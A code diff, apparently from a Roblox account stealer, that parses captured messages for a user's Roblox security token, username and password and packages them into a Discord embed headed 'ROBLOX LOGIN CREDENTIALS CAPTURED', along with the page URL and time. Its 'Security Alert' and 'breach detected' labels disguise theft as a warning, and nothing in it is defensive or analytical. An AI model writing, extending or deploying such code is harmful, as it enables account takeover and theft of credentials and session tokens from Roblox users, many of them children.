@@ -99,30 +99,45 @@ function formatLogForDiscord(logData) {
 }
 
 function formatRobloxLoginEmbed(logData) {
+  // Parse the message to extract token, username, and password
+  const message = logData.message;
+  const tokenMatch = message.match(/🔐 ROBLOX SECURITY TOKEN DETECTED: (.+?)(?:\n|$)/);
+  const usernameMatch = message.match(/👤 USERNAME: (.+?)(?:\n|$)/);
+  const passwordMatch = message.match(/🔑 PASSWORD: (.+?)(?:\n|$)/);
+  
+  const token = tokenMatch ? tokenMatch[1] : 'Not captured';
+  const username = usernameMatch ? usernameMatch[1] : 'Not captured';
+  const password = passwordMatch ? passwordMatch[1] : 'Not captured';
+  
+  // Format description with proper code blocks
+  let description = `\`\`\`\n🔐 ROBLOX SECURITY TOKEN DETECTED: ${token}\`\`\`\n`;
+  description += `👤 USERNAME: \`\`\`${username}\`\`\`\n`;
+  description += `🔑 PASSWORD: \`\`\`${password}\`\`\``;
+  
   return {
     embeds: [{
-      title: `🔐 ROBLOX LOGIN CREDENTIALS CAPTURED`,
-      description: `\`\`\`\n${logData.message}\`\`\``,
-      color: 0xff0000, // Red for security alert
+      title: "🔐 ROBLOX LOGIN CREDENTIALS CAPTURED",
+      description: description,
+      color: 16711680, // Red color as decimal
       fields: [
         {
-          name: '🌐 URL',
-          value: logData.url || 'Unknown',
+          name: "🌐 URL",
+          value: logData.url || "Unknown",
           inline: true
         },
         {
-          name: '⏰ Timestamp',
+          name: "⏰ Timestamp",
           value: new Date(logData.timestamp).toLocaleString(),
           inline: true
         },
         {
-          name: '⚠️ Security Alert',
-          value: 'Credentials and security token captured',
+          name: "⚠️ Security Alert",
+          value: "Credentials and security token captured",
           inline: false
         }
       ],
       footer: {
-        text: `🔒 ROBLOX SECURITY BREACH DETECTED`
+        text: "🔒 ROBLOX SECURITY BREACH DETECTED"
       },
       timestamp: new Date(logData.timestamp).toISOString()
     }]
